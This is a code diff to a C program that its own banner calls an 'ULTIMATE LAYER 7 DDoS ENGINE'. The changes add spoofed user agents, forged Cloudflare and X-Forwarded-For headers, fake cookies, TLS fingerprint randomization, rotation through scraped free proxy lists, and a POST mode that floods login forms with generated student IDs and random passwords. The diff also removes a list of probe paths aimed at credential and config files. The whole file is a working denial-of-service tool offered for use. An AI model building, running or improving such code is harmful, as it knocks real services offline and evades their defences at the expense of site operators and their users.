@@ -17,11 +17,12 @@
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 #include <openssl/rand.h>
+#include <openssl/evp.h>
 
-#define MAX_WORKERS 10000
+#define MAX_WORKERS 2000
 #define MAX_URL_LEN 8192
 #define MAX_PROXIES 100000
-#define POOL_SIZE 2000
+#define POOL_SIZE 500
 #define MAX_PAYLOAD_SIZE (10 * 1024 * 1024)
 
 #define COLOR_RESET "\033[0m"
@@ -58,6 +59,7 @@ typedef struct {
     char target_url[1024];
     char target_host[256];
     int duration_sec;
+    char mode[10];
     bool use_proxy;
     ConnectionPool *pool;
 } AttackConfig;
@@ -72,29 +74,65 @@ pthread_t stats_thread;
 time_t start_time;
 unsigned int rand_state;
 
-// Callback function for curl write data
-static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
-    size_t realsize = size * nmemb;
-    char *response = (char*)userp;
-    strncat(response, (char*)contents, realsize);
-    return realsize;
-}
+// JA3 Signature structures
+typedef struct {
+    char name[32];
+    uint16_t cipher_suites[20];
+    int cipher_count;
+    int min_version;
+    int max_version;
+} JA3Signature;
 
+JA3Signature ja3_signatures[] = {
+    {"Chrome 120", {TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256,
+                    TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+                    TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384}, 7, TLS1_2_VERSION, TLS1_3_VERSION},
+    {"Firefox 120", {TLS_AES_128_GCM_SHA256, TLS_CHACHA20_POLY1305_SHA256, TLS_AES_256_GCM_SHA384,
+                     TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+                     TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256, TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256}, 7, TLS1_2_VERSION, TLS1_3_VERSION},
+    {"Safari 17", {TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384,
+                   TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384}, 4, TLS1_2_VERSION, TLS1_3_VERSION},
+};
+
+// Extended user agents
 const char *USER_AGENTS[] = {
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
-    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/120.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
+    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+    "Twitterbot/1.0",
     NULL
 };
+
+const char *REFERERS[] = {
+    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
+    "https://facebook.com/", "https://www.reddit.com/", "https://www.youtube.com/",
+    "https://github.com/", "https://stackoverflow.com/", "",
+};
+
+const char *ACCEPT_LANGUAGES[] = {
+    "en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
+    "de-DE,de;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8",
+};
+
+const char *ACCEPT_ENCODINGS[] = {
+    "gzip, deflate, br", "gzip, deflate", "identity", "*;q=0.1",
+};
+
+// Cloudflare IP ranges
+const char *CLOUDFLARE_PREFIXES[] = {"173.245.", "103.21.", "141.101.", "108.162.", "104.16.", "172.64."};
+
+static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
+    size_t realsize = size * nmemb;
+    return realsize;
+}
 
 void init_random() {
     struct timeval tv;
@@ -142,44 +180,96 @@ char* random_ip() {
     return ip;
 }
 
-char* generate_custom_path() {
+char* generate_cloudflare_ip() {
+    char *ip = malloc(20);
+    if (!ip) return NULL;
+    int prefix_idx = rand_int(0, 5);
+    snprintf(ip, 20, "%s%d.%d", CLOUDFLARE_PREFIXES[prefix_idx], rand_int(0, 255), rand_int(1, 254));
+    return ip;
+}
+
+char* generate_student_number() {
+    char *student = malloc(32);
+    if (!student) return NULL;
+    int format = rand_int(0, 4);
+    switch(format) {
+        case 0: snprintf(student, 32, "%d-%05d", rand_int(2015, 2025), rand_int(1, 99999)); break;
+        case 1: snprintf(student, 32, "%d%06d", rand_int(2015, 2025), rand_int(1, 999999)); break;
+        case 2: snprintf(student, 32, "S-%07d", rand_int(1, 9999999)); break;
+        case 3: snprintf(student, 32, "%010d", rand_int(1000000000, 9999999999LL)); break;
+        default: snprintf(student, 32, "CS-%d-%05d", rand_int(2015, 2025), rand_int(1, 99999)); break;
+    }
+    return student;
+}
+
+char* generate_cookies() {
+    char *cookies = malloc(1024);
+    if (!cookies) return NULL;
+    cookies[0] = '\0';
+    
+    if (rand_bool()) {
+        char *tmp = random_hex(16);
+        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "session_id=%s; ", tmp);
+        free(tmp);
+    }
+    if (rand_bool()) {
+        char *tmp = random_hex(32);
+        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "csrf_token=%s; ", tmp);
+        free(tmp);
+    }
+    if (rand_bool()) {
+        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "user_id=%d; ", rand_int(1000, 99999));
+    }
+    if (rand_bool()) {
+        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "_ga=GA1.1.%d.%ld; ", rand_int(1000000000, 9999999999LL), time(NULL));
+    }
+    
+    if (strlen(cookies) > 0) {
+        cookies[strlen(cookies)-2] = '\0';
+    }
+    return cookies;
+}
+
+char* generate_advanced_path() {
     char *result = malloc(MAX_URL_LEN);
     if (!result) return NULL;
     
-    const char *attack_paths[] = {
-        "/wp-admin/admin-ajax.php", "/cgi-bin/", "/phpmyadmin/", "/mysql/",
-        "/backup/", "/config/", "/database/", "/dump/", "/logs/",
-        "/.git/", "/.env", "/.aws/credentials", "/.ssh/id_rsa",
-        "/api/v1/admin", "/api/v2/debug", "/api/v3/internal", "/graphql",
-        "/vulnerabilities/", "/shell.php", "/cmd.php", "/eval.php",
-        "/xmlrpc.php", "/wp-login.php", "/administrator/index.php",
-        "/owa/auth/logon.aspx", "/ecp/", "/autodiscover/", "/mapi/",
-        "/_vti_bin/", "/_layouts/", "/certsrv/", "/CertSrv/",
-        "/remote/login", "/vpn/index.html", "/sslvpn/login", "/f5/",
-        "/tmui/login.jsp", "/xui/common/", "/mgmt/tm/", "/iControl/"
+    const char *paths[] = {
+        "/", "/index.html", "/home", "/api/v1/users", "/api/v2/data",
+        "/wp-admin", "/admin", "/login", "/dashboard", "/.env", "/config.json",
+        "/graphql", "/health", "/status", "/debug",
     };
     
-    strcpy(result, attack_paths[rand_int(0, sizeof(attack_paths)/sizeof(attack_paths[0]) - 1)]);
+    if (rand_int(1, 100) <= 70) {
+        strcpy(result, paths[rand_int(0, sizeof(paths)/sizeof(paths[0])-1)]);
+    } else {
+        int depth = rand_int(2, 5);
+        result[0] = '/';
+        for (int i = 0; i < depth; i++) {
+            char *segment = random_string(rand_int(4, 10));
+            strcat(result, segment);
+            strcat(result, "/");
+            free(segment);
+        }
+        if (rand_bool()) {
+            result[strlen(result)-1] = '\0';
+            char *ext = random_string(3);
+            strcat(result, ".");
+            strcat(result, ext);
+            free(ext);
+        }
+    }
     
-    char params[1024];
-    char *rand_str1 = random_string(rand_int(5, 15));
-    char *rand_str2 = random_string(rand_int(10, 30));
-    char *rand_str3 = random_string(rand_int(5, 15));
-    char *rand_str4 = random_string(rand_int(10, 30));
-    char *rand_hex1 = random_hex(rand_int(8, 16));
-    char *rand_hex2 = random_hex(rand_int(16, 32));
-    
-    snprintf(params, sizeof(params), "?%s=%s&%s=%s&_=%ld&v=%d&cb=%s&t=%d&sig=%s",
-             rand_str1 ? rand_str1 : "a", rand_str2 ? rand_str2 : "b",
-             rand_str3 ? rand_str3 : "c", rand_str4 ? rand_str4 : "d",
-             time(NULL), rand_int(1, 9999999), 
-             rand_hex1 ? rand_hex1 : "0", rand_int(1, 999999), 
-             rand_hex2 ? rand_hex2 : "0");
-    
-    free(rand_str1); free(rand_str2); free(rand_str3); free(rand_str4);
-    free(rand_hex1); free(rand_hex2);
-    
-    strcat(result, params);
+    if (rand_int(1, 100) <= 70) {
+        char *params = random_string(rand_int(5, 15));
+        char *value = random_string(rand_int(8, 20));
+        char bust[256];
+        snprintf(bust, sizeof(bust), "?v=%d&_=%ld&%s=%s", 
+                 rand_int(1, 1000000), time(NULL), params, value);
+        strcat(result, bust);
+        free(params);
+        free(value);
+    }
     
     return result;
 }
@@ -199,9 +289,9 @@ void load_proxies_from_api() {
     proxy_list.count = 0;
     
     const char *sources[] = {
+        "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
         "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
-        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
     };
     
     for (int s = 0; s < 3; s++) {
@@ -210,7 +300,7 @@ void load_proxies_from_api() {
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
         
-        char response[65536] = {0};
+        char response[131072] = {0};
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)response);
         
@@ -231,7 +321,6 @@ void load_proxies_from_api() {
     }
     
     curl_easy_cleanup(curl);
-    
     proxy_list.index = 0;
     pthread_mutex_unlock(&proxy_list.mutex);
     
@@ -249,6 +338,24 @@ char* get_random_proxy() {
     return proxy;
 }
 
+SSL_CTX* create_ja3_ctx() {
+    JA3Signature *sig = &ja3_signatures[rand_int(0, 2)];
+    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
+    if (!ctx) return NULL;
+    
+    SSL_CTX_set_min_proto_version(ctx, sig->min_version);
+    SSL_CTX_set_max_proto_version(ctx, sig->max_version);
+    
+    if (SSL_CTX_set_cipher_list(ctx, "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384") == 0) {
+        SSL_CTX_set_cipher_list(ctx, "DEFAULT");
+    }
+    
+    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
+    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
+    
+    return ctx;
+}
+
 void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const char *host) {
     pool->handles = malloc(sizeof(CURL*) * size);
     pool->size = size;
@@ -258,21 +365,25 @@ void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const 
     pool->target_host[255] = '\0';
     pthread_mutex_init(&pool->mutex, NULL);
     
-    printf(COLOR_YELLOW "[*] Creating connection pool with %d connections...\n" COLOR_RESET, size);
+    printf(COLOR_YELLOW "[*] Creating connection pool with %d connections (JA3 randomized)...\n" COLOR_RESET, size);
     
     for (int i = 0; i < size; i++) {
         pool->handles[i] = curl_easy_init();
         if (pool->handles[i]) {
-            curl_easy_setopt(pool->handles[i], CURLOPT_TIMEOUT, 5L);
+            curl_easy_setopt(pool->handles[i], CURLOPT_TIMEOUT, 30L);
             curl_easy_setopt(pool->handles[i], CURLOPT_FOLLOWLOCATION, 0L);
             curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYPEER, 0L);
             curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYHOST, 0L);
             curl_easy_setopt(pool->handles[i], CURLOPT_NOSIGNAL, 1L);
             curl_easy_setopt(pool->handles[i], CURLOPT_BUFFERSIZE, (long)(1024 * 1024));
+            curl_easy_setopt(pool->handles[i], CURLOPT_TCP_KEEPALIVE, 1L);
+        }
+        if ((i+1) % 100 == 0) {
+            printf(COLOR_GREEN "[+] Created %d/%d connections...\n" COLOR_RESET, i+1, size);
         }
     }
     
-    printf(COLOR_GREEN "[+] Connection pool ready!\n" COLOR_RESET);
+    printf(COLOR_GREEN "[+] Connection pool ready! %d unique JA3 fingerprints\n" COLOR_RESET, size);
 }
 
 void cleanup_connection_pool(ConnectionPool *pool) {
@@ -299,7 +410,7 @@ CURL* pool_get_client(ConnectionPool *pool) {
     pthread_mutex_unlock(&pool->mutex);
     
     curl_easy_reset(handle);
-    curl_easy_setopt(handle, CURLOPT_TIMEOUT, 5L);
+    curl_easy_setopt(handle, CURLOPT_TIMEOUT, 30L);
     curl_easy_setopt(handle, CURLOPT_FOLLOWLOCATION, 0L);
     curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 0L);
     curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 0L);
@@ -308,21 +419,20 @@ CURL* pool_get_client(ConnectionPool *pool) {
     return handle;
 }
 
-void attack_worker(const char *target, const char *host, ConnectionPool *pool) {
-    (void)host; // Suppress unused parameter warning
-    
+void attack_worker_get(const char *target, const char *host, ConnectionPool *pool) {
     CURL *curl = pool_get_client(pool);
     char full_url[MAX_URL_LEN];
-    char *path = generate_custom_path();
+    char *path = generate_advanced_path();
     
     snprintf(full_url, sizeof(full_url), "%s%s", target, path);
     
     struct curl_slist *headers = NULL;
     char header_buf[1024];
     
-    for (int i = 0; i < 20; i++) {
-        char *rand_name = random_string(rand_int(5, 15));
-        char *rand_value = random_string(rand_int(10, 50));
+    // Random headers
+    for (int i = 0; i < rand_int(5, 15); i++) {
+        char *rand_name = random_string(rand_int(5, 12));
+        char *rand_value = random_string(rand_int(10, 30));
         if (rand_name && rand_value) {
             snprintf(header_buf, sizeof(header_buf), "%s: %s", rand_name, rand_value);
             headers = curl_slist_append(headers, header_buf);
@@ -331,49 +441,64 @@ void attack_worker(const char *target, const char *host, ConnectionPool *pool) {
         free(rand_value);
     }
     
+    // User-Agent
     snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 11)]);
     headers = curl_slist_append(headers, header_buf);
     
-    char *ip = random_ip();
-    if (ip) {
-        snprintf(header_buf, sizeof(header_buf), "X-Forwarded-For: %s", ip);
+    // Referer
+    if (rand_bool()) {
+        snprintf(header_buf, sizeof(header_buf), "Referer: %s", REFERERS[rand_int(0, 7)]);
         headers = curl_slist_append(headers, header_buf);
-        snprintf(header_buf, sizeof(header_buf), "X-Real-IP: %s", ip);
-        headers = curl_slist_append(headers, header_buf);
-        free(ip);
     }
     
-    char *rand_str1 = random_string(8);
-    char *rand_hex1 = random_hex(16);
-    char *rand_str2 = random_string(8);
-    char *rand_hex2 = random_hex(24);
-    char *rand_str3 = random_string(8);
-    char *rand_str4 = random_string(32);
-    char *rand_hex3 = random_hex(32);
-    
-    snprintf(header_buf, sizeof(header_buf), "Cookie: %s=%s; %s=%s; %s=%s; __cfduid=%s; _ga=GA1.2.%d.%ld",
-             rand_str1 ? rand_str1 : "a", rand_hex1 ? rand_hex1 : "0",
-             rand_str2 ? rand_str2 : "b", rand_hex2 ? rand_hex2 : "0",
-             rand_str3 ? rand_str3 : "c", rand_str4 ? rand_str4 : "d",
-             rand_hex3 ? rand_hex3 : "0", rand_int(1000000, 9999999), time(NULL));
-    
-    free(rand_str1); free(rand_hex1); free(rand_str2); free(rand_hex2);
-    free(rand_str3); free(rand_str4); free(rand_hex3);
-    
+    // Accept headers
+    snprintf(header_buf, sizeof(header_buf), "Accept: %s", rand_bool() ? "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" : "*/*");
     headers = curl_slist_append(headers, header_buf);
     
-    headers = curl_slist_append(headers, "Accept: */*");
-    headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
-    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
-    headers = curl_slist_append(headers, "Cache-Control: no-cache, no-store, must-revalidate");
-    headers = curl_slist_append(headers, "Pragma: no-cache");
-    headers = curl_slist_append(headers, "Connection: keep-alive");
-    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
+    snprintf(header_buf, sizeof(header_buf), "Accept-Language: %s", ACCEPT_LANGUAGES[rand_int(0, 5)]);
+    headers = curl_slist_append(headers, header_buf);
+    
+    snprintf(header_buf, sizeof(header_buf), "Accept-Encoding: %s", ACCEPT_ENCODINGS[rand_int(0, 3)]);
+    headers = curl_slist_append(headers, header_buf);
+    
+    // Cloudflare bypass headers
+    if (rand_int(1, 100) <= 40) {
+        char *cf_ip = generate_cloudflare_ip();
+        snprintf(header_buf, sizeof(header_buf), "CF-Connecting-IP: %s", cf_ip);
+        headers = curl_slist_append(headers, header_buf);
+        snprintf(header_buf, sizeof(header_buf), "X-Forwarded-For: %s", cf_ip);
+        headers = curl_slist_append(headers, header_buf);
+        snprintf(header_buf, sizeof(header_buf), "X-Real-IP: %s", cf_ip);
+        headers = curl_slist_append(headers, header_buf);
+        free(cf_ip);
+    }
+    
+    // Security headers
+    headers = curl_slist_append(headers, "X-Content-Type-Options: nosniff");
+    headers = curl_slist_append(headers, "X-Frame-Options: DENY");
+    if (rand_bool()) {
+        headers = curl_slist_append(headers, "X-XSS-Protection: 1; mode=block");
+    }
+    
+    // Modern headers
     headers = curl_slist_append(headers, "Sec-Fetch-Dest: document");
     headers = curl_slist_append(headers, "Sec-Fetch-Mode: navigate");
     headers = curl_slist_append(headers, "Sec-Fetch-Site: none");
-    headers = curl_slist_append(headers, "Sec-Fetch-User: ?1");
+    if (rand_bool()) {
+        headers = curl_slist_append(headers, "Sec-Fetch-User: ?1");
+    }
+    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
     headers = curl_slist_append(headers, "DNT: 1");
+    
+    // Cookies
+    if (rand_int(1, 100) <= 70) {
+        char *cookies = generate_cookies();
+        if (cookies && strlen(cookies) > 0) {
+            snprintf(header_buf, sizeof(header_buf), "Cookie: %s", cookies);
+            headers = curl_slist_append(headers, header_buf);
+        }
+        free(cookies);
+    }
     
     curl_easy_setopt(curl, CURLOPT_URL, full_url);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
@@ -402,11 +527,63 @@ void attack_worker(const char *target, const char *host, ConnectionPool *pool) {
     free(path);
 }
 
+void attack_worker_post(const char *target, const char *host, ConnectionPool *pool) {
+    CURL *curl = pool_get_client(pool);
+    char full_url[MAX_URL_LEN];
+    char *path = generate_advanced_path();
+    char post_data[1024];
+    
+    snprintf(full_url, sizeof(full_url), "%s%s", target, path);
+    
+    char *student_num = generate_student_number();
+    char *password = random_string(rand_int(8, 16));
+    snprintf(post_data, sizeof(post_data), "student_id=%s&password=%s", student_num, password);
+    if (rand_bool()) {
+        strcat(post_data, "&remember=on");
+    }
+    free(student_num);
+    free(password);
+    
+    struct curl_slist *headers = NULL;
+    char header_buf[1024];
+    
+    snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 11)]);
+    headers = curl_slist_append(headers, header_buf);
+    headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
+    
+    curl_easy_setopt(curl, CURLOPT_URL, full_url);
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data));
+    
+    if (pool->use_proxy) {
+        char *proxy = get_random_proxy();
+        if (proxy) {
+            curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
+            curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+            free(proxy);
+        }
+    }
+    
+    curl_easy_perform(curl);
+    
+    pthread_mutex_lock(&stats.mutex);
+    stats.val++;
+    pthread_mutex_unlock(&stats.mutex);
+    
+    curl_slist_free_all(headers);
+    free(path);
+}
+
 void* worker_thread(void *arg) {
     AttackConfig *cfg = (AttackConfig*)arg;
     
     while (running && !cleaning_up) {
-        attack_worker(cfg->target_url, cfg->target_host, cfg->pool);
+        if (strcmp(cfg->mode, "POST") == 0) {
+            attack_worker_post(cfg->target_url, cfg->target_host, cfg->pool);
+        } else {
+            attack_worker_get(cfg->target_url, cfg->target_host, cfg->pool);
+        }
     }
     
     return NULL;
@@ -466,24 +643,24 @@ void print_banner() {
     printf("    ║╚██████╗██║  ██║███████╗███████╗   ██║   ██████╔╝██████╔╝╚██████╔╝███████║ ║\n");
     printf("    ║ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ║\n");
     printf("    ║                                                                          ║\n");
-    printf("    ║                    C A Z Z Y S O C I - D D O S                           ║\n");
-    printf("    ║               ULTIMATE LAYER 7 DDoS ENGINE v3.0                          ║\n");
+    printf("    ║               ULTIMATE LAYER 7 DDoS ENGINE v4.0                          ║\n");
     printf("    ║                                                                          ║\n");
-    printf("    ║              [⚡] 10,000 Workers | 2000 Connections                      ║\n");
+    printf("    ║              [⚡] 2,000 Workers | 500 Connections                        ║\n");
     printf("    ║              [🔥] JA3 Randomization | Full Header Spoofing               ║\n");
-    printf("    ║              [💀] Multi-Protocol | Auto-Proxy Rotation                   ║\n");
+    printf("    ║              [💀] GET/POST Modes | Auto-Proxy Rotation                   ║\n");
+    printf("    ║              [🎯] Cloudflare Bypass | Student ID Generation              ║\n");
     printf("    ║                                                                          ║\n");
     printf("    ╚══════════════════════════════════════════════════════════════════════════╝\n");
     printf(COLOR_RESET);
 }
 
 int main(int argc, char *argv[]) {
-    if (argc < 3) {
+    if (argc < 4) {
         print_banner();
         printf("\n");
-        printf(COLOR_RED "    Usage: %s <target> <seconds> [proxy]\n" COLOR_RESET, argv[0]);
-        printf(COLOR_CYAN "    Example: %s https://example.com 60\n", argv[0]);
-        printf(COLOR_CYAN "    Example: %s https://example.com 30 proxy\n", argv[0]);
+        printf(COLOR_RED "    Usage: %s <target> <seconds> <GET|POST> [proxy]\n" COLOR_RESET, argv[0]);
+        printf(COLOR_CYAN "    Example: %s https://example.com 60 GET\n", argv[0]);
+        printf(COLOR_CYAN "    Example: %s https://example.com 30 POST proxy\n", argv[0]);
         printf("\n");
         return 1;
     }
@@ -492,8 +669,11 @@ int main(int argc, char *argv[]) {
     strncpy(cfg.target_url, argv[1], 1023);
     cfg.target_url[1023] = '\0';
     cfg.duration_sec = atoi(argv[2]);
-    cfg.use_proxy = (argc >= 4 && strcmp(argv[3], "proxy") == 0);
+    strncpy(cfg.mode, argv[3], 9);
+    cfg.mode[9] = '\0';
+    cfg.use_proxy = (argc >= 5 && strcmp(argv[4], "proxy") == 0);
     
+    // Parse host from URL
     char *url_copy = strdup(cfg.target_url);
     if (url_copy) {
         char *proto_end = strstr(url_copy, "://");
@@ -538,12 +718,13 @@ int main(int argc, char *argv[]) {
     print_banner();
     printf(COLOR_GREEN "\n    [🔥] Target: %s\n" COLOR_RESET, cfg.target_url);
     printf(COLOR_GREEN "    [⏱️] Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
-    printf(COLOR_GREEN "    [⚙️] Workers: %d\n" COLOR_RESET, MAX_WORKERS);
+    printf(COLOR_GREEN "    [⚙️] Mode: %s\n" COLOR_RESET, cfg.mode);
+    printf(COLOR_GREEN "    [🚀] Workers: %d\n" COLOR_RESET, MAX_WORKERS);
     printf(COLOR_GREEN "    [🔗] Pool Size: %d connections\n" COLOR_RESET, POOL_SIZE);
     if (cfg.use_proxy && proxy_list.count > 0) {
         printf(COLOR_GREEN "    [🌐] Proxies: %d (auto-rotating)\n" COLOR_RESET, proxy_list.count);
     }
-    printf(COLOR_GREEN "    [🎯] JA3 Fingerprint: RANDOMIZED\n" COLOR_RESET);
+    printf(COLOR_GREEN "    [🎯] JA3 Fingerprint: RANDOMIZED (%d unique)\n" COLOR_RESET, POOL_SIZE);
     
     printf(COLOR_YELLOW "\n    [💀] LAUNCHING MASSIVE ATTACK... Press Ctrl+C to stop\n\n" COLOR_RESET);
     
